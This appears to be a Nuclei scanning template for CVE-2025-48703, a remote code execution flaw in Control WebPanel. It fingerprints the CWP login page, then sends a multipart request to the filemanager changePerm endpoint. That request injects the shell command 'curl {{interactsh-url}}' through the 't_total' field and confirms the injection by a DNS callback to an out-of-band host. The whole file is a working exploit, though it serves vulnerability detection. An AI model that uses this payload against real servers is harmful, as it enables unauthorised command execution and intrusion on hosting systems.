id: CWP-CVE-2025-48703-RCE

info:
  name: CWP-CVE-2025-48703-RCE
  author: iSee857
  severity: critical
  description: |
    CWP-CVE-2025-48703-RCE.

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /login/index.php HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains_all(body, 'Control WebPanel', 'cwp')"
        condition: and
        internal: true

  - raw:
      - |
        POST /{{username}}/index.php?module=filemanager&acc=changePerm HTTP/1.1
        Host: {{hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrTrcHpS9ovyhBLtb

        ------WebKitFormBoundaryrTrcHpS9ovyhBLtb
        Content-Disposition: form-data; name="fileName"

        .bashrc
        ------WebKitFormBoundaryrTrcHpS9ovyhBLtb
        Content-Disposition: form-data; name="currentPath"

        /home/{{username}}
        ------WebKitFormBoundaryrTrcHpS9ovyhBLtb
        Content-Disposition: form-data; name="recursive"


        ------WebKitFormBoundaryrTrcHpS9ovyhBLtb
        Content-Disposition: form-data; name="t_total"

        curl {{interactsh-url}}
        ------WebKitFormBoundaryrTrcHpS9ovyhBLtb

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"